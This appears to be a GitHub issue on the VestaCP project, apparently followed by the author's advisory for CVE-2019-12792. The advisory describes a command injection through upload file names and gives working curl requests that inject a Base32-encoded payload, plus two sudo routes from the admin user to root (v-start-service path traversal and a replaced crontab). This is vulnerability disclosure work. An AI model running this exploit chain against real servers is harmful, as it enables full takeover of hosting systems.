## Description

![@cyrus-and](https://avatars.githubusercontent.com/u/1660263?u=f98b0d6c2f984a656573c0942c9aaf955d5e8013&v=4&size=48)[cyrus-and](https://github.com/cyrus-and)opened [on Jul 29, 2019](https://github.com/outroll/vesta/issues/1921#issue-474169297)

(Sorry for the *dramatic* subject.)

Well, it's really disappointing and unprofessional to come to this...

Two months ago (2019-05-28) I disclosed two privilege escalation vulnerabilities to info@vestacp.com (and eventually also to dev@vestacp.com and skid@vestacp.com), I obtained no useful replies or actions so I'm trying to reach a wider audience by opening an issue here (and no, I won't join the forum).

As today the two vulnerabilities are still undisclosed as I fairly believe that a responsible disclosure approach is the right way to go. Yet we're pushing the boundaries here and I don't think the maintainers are being respectful of the userbase.

So this is my last attempt to get these issues fixed, after that I will disclose them anyway, fixed or not. Users having write access to this repo can reach me privately for details, it's even better if they reply to the original message sent to the above @vestacp.com addresses, provided that they're allowed to do that.

# [CVE-2019-12792] Vesta Control Panel 0.9.8-24 — Privilege escalation in the upload handler

Andrea Cardaci — 12 August 2019

| --- | --- |
| **Discovered** | 2019-03-15 |
| **Author** | Andrea Cardaci |
| **Product** | [Vesta Control Panel](https://vestacp.com/) |
| **Tested versions** | 0.9.8-24 |
| **CVE** | [CVE-2019-12792](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12792) |

## Abstract

The insufficient shell escaping mechanism used during the invocation of the `exec` PHP function allows a registered user to run arbitrary system commands as the `admin` user, to whom VestaCP grants full access. A malicious registered user can thus escalate its privileges up to `root` by submitting a POST request to the web application.

[HestiaCP](https://www.hestiacp.com/) (an actively maintained fork of VestaCP) version 1.0.4 is also vulnerable but a fix has been promptly deployed in version 1.0.5.

## Details

The PHP script reachable at `/upload/UploadHandler.php` naively uses `'...'` to shell-escape the user input (instead of using `escapeshellarg`):

```
exec (VESTA_CMD . "v-copy-fs-file ". USERNAME ." {$uploaded_file} '{$file_path}'", $output, $return_var);

```

The `$file_path` variable is controlled by the user as it corresponds to the name of the file being uploaded. By crafting a proper file name it is possible to escape the single quotes and *blindly* run additional commands as the `admin` user (the one that runs the web server in VestaCP).

For example, the following `curl` invocation uses the `sleep` command to prove the RCE success:

```
$ PHPSESSID=... # grab it from an authenticated regular user session
$ time curl -sk -o /dev/null https://target.com:8083/upload/ \
    -b "PHPSESSID=$PHPSESSID" \
    -F "files=@/dev/null;filename=\"';sleep 5;#\""
real    0m5.097s
user    0m0.032s
sys     0m0.004s

```

Since the file name is filtered through the `basename` PHP function, the payload cannot contain `/`. Follows a more general solution that allows to execute arbitrary commands by using the Base32 encoding:

```
$ COMMAND='[ -w ~admin/.bashrc ] && sleep 5'
$ PAYLOAD="$(echo "$COMMAND" | base32 -w0)"
$ time curl -sk -o /dev/null https://target.com:8083/upload/ \
    -b "PHPSESSID=$PHPSESSID" \
    -F "files=@/dev/null;filename=\"';echo $PAYLOAD | base32 -d | sh;#\""
real    0m5.087s
user    0m0.028s
sys     0m0.000s

```

The above also proves that is possible to write files in the `admin` home directory.

### From admin to root access

The `admin` user ultimately has full access to the target machine, yet VestaCP seems to make it hard for it to run superuser commands. For completeness, follows two possible ways to accomplish that.

#### Misusing the `v-start-service` command

The `service` system command provides a way to execute arbitrary executables and not only init scripts[1](#fn:service). Since `v-start-service` is a merely wrapper around `service`, it is possible to exploit it to run arbitrary executables as `root`.

Set the `COMMAND` variable as follows:

```
$ COMMAND='
    echo "id >/usr/local/vesta/web/proof" >/tmp/x
    chmod +x /tmp/x
    sudo /usr/local/vesta/bin/v-start-service ../../tmp/x'

```

Run the remaining commands as above, then check that the proof file is created in the web server root:

```
$ curl -k https://target.com:8083/proof
uid=0(root) gid=0(root) groups=0(root)

```
#### Using cron

One simple way for the `admin` user to legitimately execute `root` commands is to replace the `/etc/crontab` file and restart the cron daemon using the `v-change-sys-service-config` VestaCP utility. Set the `COMMAND` variable as follows:

```
$ COMMAND='
    echo "* * * * * root id >/usr/local/vesta/web/proof" >/tmp/x
    sudo /usr/local/vesta/bin/v-change-sys-service-config /tmp/x cron yes'

```

Run the remaining commands as above, then after one minute check that the proof file is created in the web server root:

```
$ curl -k https://target.com:8083/proof
uid=0(root) gid=0(root) groups=0(root)

```
## Other instances of similar vulnerabilities

Several other instances of the same or similar problems have been found in the VestaCP source code. The following list[2](#fn:git-tree) is a best-effort attempt to enumerate such instances, they are not tested and often are not exploitable in practice or not interesting since only the `admin` user can reach the code, but should nevertheless be fixed[3](#fn:fixed):
